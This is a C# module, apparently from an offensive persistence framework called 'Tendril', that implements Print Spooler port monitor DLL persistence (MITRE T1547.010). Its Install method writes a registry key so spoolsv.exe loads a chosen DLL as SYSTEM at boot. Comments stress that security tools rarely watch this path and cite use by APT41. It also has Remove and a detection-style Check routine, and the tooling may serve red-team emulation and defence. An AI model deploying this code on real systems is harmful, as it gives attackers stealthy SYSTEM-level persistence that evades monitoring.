using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Port Monitor DLL Persistence (T1547.010)
    ///
    /// The Print Spooler service (spoolsv.exe, runs as SYSTEM) loads DLLs
    /// registered as port monitors under:
    ///   HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\[Name]\Driver
    ///
    /// The DLL must reside in System32. Loaded at boot when the Spooler starts,
    /// and on demand when the Spooler restarts. Runs in SYSTEM context.
    ///
    /// Used by APT41 in financial sector breaches. Low detection - security tools
    /// rarely monitor the Print\Monitors registry path.
    /// </summary>
    public class PortMonitorDll : ITendril
    {
        public string Name { get { return "PortMonitorDll"; } }
        public string Description { get { return "Print Spooler port monitor DLL - SYSTEM exec at boot via spoolsv.exe"; } }
        public string MitreId { get { return "T1547.010"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string MonitorsPath = @"SYSTEM\CurrentControlSet\Control\Print\Monitors";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, name;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<dll_filename_in_system32>");
            if (!options.TryGetValue("name", out name))
                name = "LocalPrintMonitor";

            // DLL must be just the filename (loaded from System32) or full path in System32
            string dllName = System.IO.Path.GetFileName(payload);

            string keyPath = MonitorsPath + @"\" + name;
            bool ok = RegistryUtils.SetRegValue("HKLM", keyPath, "Driver", dllName);
            if (!ok)
                return new TendrilResult(ResultStatus.Failed, Name, "Failed to write monitor key (admin?)");

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Port monitor registered: {0} -> {1}", name, dllName))
                .WithMeta("MonitorName", name)
                .WithMeta("Driver", dllName)
                .WithMeta("Note", "DLL must exist in C:\\Windows\\System32. Restart Spooler to load.");
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string name;
            if (!options.TryGetValue("name", out name))
                name = "LocalPrintMonitor";

            RegistryUtils.DeleteRegKeyTree("HKLM", MonitorsPath + @"\" + name);
            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Port monitor removed: {0}", name));
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            // Known legitimate monitors
            var known = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "Local Port", "Standard TCP/IP Port", "USB Monitor",
                "WSD Port", "Microsoft Shared Fax Monitor",
                "Local Monitor", "AppMon Monitor"
            };

            string[] monitors = RegistryUtils.GetRegSubkeys("HKLM", MonitorsPath);
            foreach (string mon in monitors)
            {
                if (known.Contains(mon)) continue;
                string driver = RegistryUtils.GetRegValue("HKLM", MonitorsPath + @"\" + mon, "Driver");
                if (!string.IsNullOrEmpty(driver))
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("Non-standard port monitor: {0} -> {1}", mon, driver))
                        .WithMeta("Monitor", mon)
                        .WithMeta("Driver", driver));
                }
            }
            return results;
        }
    }
}
